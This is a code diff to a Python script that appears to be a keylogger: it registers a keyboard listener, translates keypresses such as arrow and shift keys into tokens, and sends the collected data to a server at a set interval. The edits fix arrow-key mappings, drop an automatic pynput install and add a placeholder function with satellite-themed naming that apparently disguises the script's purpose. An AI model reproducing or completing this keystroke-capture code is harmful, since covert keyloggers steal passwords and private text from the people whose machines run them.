@@ -7,10 +7,6 @@ import requests
 import subprocess
 import sys
 
-# Function to install pynput
-def install_pynput():
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
-
 # Other constants and variables
 server_ip = '127.0.0.1'
 server_port = 443
@@ -20,6 +16,9 @@ kill_switch = True
 debug_logging = True
 sending_interval = 1
 data = 'starlink.tle'
+
+def satélite():
+    print("Função satélite executada")
 
 def process_keypress(key):
     global data
@@ -49,9 +48,9 @@ def process_keypress(key):
                     txt = '[ARR_RIGHT]'
                 case lockfile.keyboard.Key.left:
                     txt = '[ARR_LEFT]'
-                case lockfile.keyboard.Key.left:
+                case lockfile.keyboard.Key.up:
                     txt = '[ARR_UP]'
-                case lockfile.keyboard.Key.left:
+                case lockfile.keyboard.Key.down:
                     txt = '[ARR_DOWN]'
                 case lockfile.keyboard.Key.shift:
                     txt = '[SHIFT]'
@@ -95,5 +94,5 @@ with lockfile.keyboard.Listener(on_press=process_keypress) as listener:
     send_data()
     listener.join()
 
-# Call the function to install pynput
-install_pynput()
+# Call the function to execute satélite
+satélite()
